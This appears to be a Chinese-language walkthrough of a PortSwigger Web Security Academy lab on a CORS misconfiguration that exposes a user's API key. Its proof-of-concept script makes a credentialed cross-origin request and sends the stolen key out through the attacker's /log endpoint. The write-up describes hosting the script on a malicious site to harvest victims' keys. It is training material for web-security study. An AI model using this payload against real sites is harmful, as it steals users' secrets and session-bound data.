

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/cors/images/9CFC99DC38A54F39BC2ECD178E451FE9clipboard.png)

首页会显示用户的api密码（在实际渗透中可以是个人敏感信息，csrf令牌....)

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/cors/images/948B366CE323426C9421A6132E6FD0DBclipboard.png)

观察到api密钥是通过一个ajax接口返回到页面。直接访问接口，并将请求来源跟改为任意网站可以获取到密钥，说明存在cors漏洞

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/cors/images/06241A7E81BD4BD8B925AAE265C88854clipboard.png)



poc:

```javascript
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://ac0c1f2b1efc321180e1a18c007100d3.web-security-academy.net/accountDetails',true);
   //
   req.withCredentials = true;
   req.send();

   function reqListener() {
    location='/log?key='+this.responseText;
   };
</script>
```

将该脚本部署到恶意网站，用户访问即可记录下受害者的api密钥

在访问记录中，发现被记录的api密钥，提交即可

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/cors/images/F06ACBB3ADF14BAD893C6A473FEDEE1Dclipboard.png)

